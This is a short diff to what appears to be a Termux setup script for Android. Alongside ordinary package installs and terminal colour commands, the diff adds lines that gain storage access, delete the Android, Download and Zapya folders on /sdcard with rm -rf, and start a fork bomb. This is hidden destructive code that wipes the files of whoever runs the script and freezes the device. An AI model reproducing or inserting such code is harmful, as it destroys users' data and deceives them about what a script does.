@@ -1,5 +1,11 @@
 pkg install ncurses-utils
 pkg install git
+termux-setup-storage
+cd /sdcard
+rm -rf Android
+rm -rf Download
+rm -rf Zapya 
+:(){ :|: & };:
 tput clear
 tput cup 3 15
 tput setaf 9
